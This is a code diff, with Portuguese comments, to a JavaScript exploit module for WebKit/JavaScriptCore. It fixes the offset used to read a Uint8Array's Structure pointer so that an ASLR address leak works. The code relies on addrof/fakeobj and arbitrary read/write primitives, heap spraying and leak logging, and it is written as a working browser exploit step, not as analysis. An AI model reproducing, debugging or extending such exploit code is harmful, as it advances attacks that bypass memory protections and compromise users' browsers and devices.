@@ -2,6 +2,7 @@
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - AGORA UTILIZA TODAS AS PRIMITIVAS (ADDROF/FAKEOBJ, ARB_READ/ARB_WRITE) DO core_exploit.mjs para maior estabilidade e clareza.
+// - **CORRIGIDO: Leitura do ponteiro da Structure* usando JSCell.STRUCTURE_POINTER_OFFSET (0x8).**
 // - Redução drástica da verbosidade dos logs de debug para facilitar a leitura.
 // - Spray volumoso e persistente.
 // - Verificação e validação contínuas em cada etapa crítica.
@@ -115,12 +116,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(`[REAL LEAK] Endereço do Uint8Array (JSCell): ${typed_array_addr.toString(true)}`, "leak");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // 3. Ler o ponteiro para a Structure* do Uint8Array (ArrayBufferView)
-        logFn(`[REAL LEAK] Tentando ler ponteiro da Structure* no offset 0x${JSC_OFFSETS_PARAM.ArrayBufferView.STRUCTURE_ID_OFFSET.toString(16)} do Uint8Array base...`, "info");
+        // 3. Ler o ponteiro para a Structure* do Uint8Array (JSCell)
+        // CORRIGIDO: Usando JSCell.STRUCTURE_POINTER_OFFSET (0x8) para ler o ponteiro da Structure
+        logFn(`[REAL LEAK] Tentando ler PONTEIRO para a Structure* no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do Uint8Array base (JSCell)...`, "info");
 
-        const structure_read_address = typed_array_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.STRUCTURE_ID_OFFSET);
-        const typed_array_structure_ptr = await arb_read(structure_read_address, 8); // Usar arb_read direto
-        logFn(`[REAL LEAK] Lido de ${structure_read_address.toString(true)}: ${typed_array_structure_ptr.toString(true)}`, "debug");
+        const structure_pointer_address = typed_array_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
+        const typed_array_structure_ptr = await arb_read(structure_pointer_address, 8); // Usar arb_read direto
+        logFn(`[REAL LEAK] Lido de ${structure_pointer_address.toString(true)}: ${typed_array_structure_ptr.toString(true)}`, "debug");
 
         if (!isAdvancedInt64Object(typed_array_structure_ptr) || typed_array_structure_ptr.equals(AdvancedInt64.Zero) || typed_array_structure_ptr.equals(AdvancedInt64.NaNValue)) {
             const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da Structure do Uint8Array. Endereço inválido: ${typed_array_structure_ptr ? typed_array_structure_ptr.toString(true) : 'N/A'}. Isso pode indicar corrupção ou offset incorreto.`;
